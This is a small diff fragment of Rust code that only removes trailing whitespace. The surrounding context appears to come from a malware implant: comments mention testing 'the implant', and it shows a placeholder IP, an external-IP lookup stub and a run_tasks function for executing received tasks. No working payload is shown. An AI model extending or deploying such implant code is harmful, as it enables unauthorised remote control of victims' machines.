@@ -255,7 +255,7 @@ pub extern "system" fn Pick() {
         //it will be replaced with the real get_external_ip function when we are ready to test the implant
         String::from("xxx.xxx.xxx.xxx") //replace with real ip
     }
-    
+
     fn get_external_ip() -> String {
         //get the external ip address
         //on linux, we can get the external ip address by making a request to a website that returns the ip address of the client
@@ -273,7 +273,7 @@ pub extern "system" fn Pick() {
         };
         ip
     }
-    
+
     // Function to run tasks
     fn run_tasks(tasks: String) -> String {
         let mut output = String::new();
